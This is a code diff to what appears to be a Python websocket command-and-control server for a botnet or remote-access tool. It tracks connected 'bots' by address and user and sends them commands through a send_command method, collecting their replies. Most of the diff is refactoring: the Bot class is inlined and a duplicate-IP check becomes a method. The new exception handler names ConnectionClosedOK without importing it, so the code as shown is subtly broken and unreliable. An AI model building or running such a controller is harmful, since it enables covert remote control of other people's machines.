@@ -1,17 +1,15 @@
-from typing import List, Union
-
 import click
-from prettytable import PrettyTable
-
-from bot import Bot
-from utils import hash_sha256, is_num, Id, configure_logging
-
 import asyncio
-import websockets
 import logging
 import termcolor
-from websockets.server import WebSocketServerProtocol as WebSocketConn
+import websockets
+
+from typing import List, Union
+from prettytable import PrettyTable
 from websockets.exceptions import ConnectionClosedError
+from utils import hash_sha256, is_num, Id, configure_logging
+from websockets.server import WebSocketServerProtocol as WebSocketConn
+
 
 
 logger = logging.getLogger(__name__)
@@ -40,19 +38,43 @@ FUN_BANNER = termcolor.colored('''
                   ooO Ooo  ''','green',attrs=["bold"])
 
 
-def isNotListed(ip: str, ip_list: Bot) -> bool:
-    for listed_ip in ip_list:
-        if ip in str(listed_ip):
-            #print(f'Type listed_ip : {type(str(listed_ip))}')
-            #print(f'IP déjà listée : {ip} --->  {listed_ip}')
+
+
+class Bot:
+    def __init__(self,
+                 idx: int,
+                 remote_address: str,
+                 ws: WebSocketConn,
+                 user: str):
+        self.idx = idx
+        self.remote_address = remote_address
+        self.ws = ws
+        self.user = user
+
+    def __str__(self):
+        return f"Bot {self.remote_address}, user: {self.user}"
+
+    async def send_command(self, command: str):
+        try:
+            await self.ws.send(command)
+            return await self.ws.recv()
+        except (ConnectionClosedError,RuntimeError,ConnectionClosedOK):
             return False
-    return True
+
 
 
 class Context:
     def __init__(self, plain_password: str):
         self.pass_hash = hash_sha256(plain_password)
         self.bots: List[Bot] = []
+
+    def isNotListed(self, ip: str, ip_list: Bot) -> bool:
+        for listed_ip in ip_list:
+            if ip in str(listed_ip):
+                #print(f'Type listed_ip : {type(str(listed_ip))}')
+                #print(f'IP déjà listée : {ip} --->  {listed_ip}')
+                return False
+        return True
 
     def get_bot(self, idx: int) -> Union[Bot, None]:
         try:
@@ -73,7 +95,7 @@ class Context:
                 ws,
                 user.strip("\n") if user else "N/A"
             )
-            if isNotListed(new_bot.remote_address, self.bots):
+            if self.isNotListed(new_bot.remote_address, self.bots):
                 self.bots.append(new_bot)
                 logger.info(f"Added {new_bot}")
                 new_bot.idx = self.bots.index(new_bot) + 1
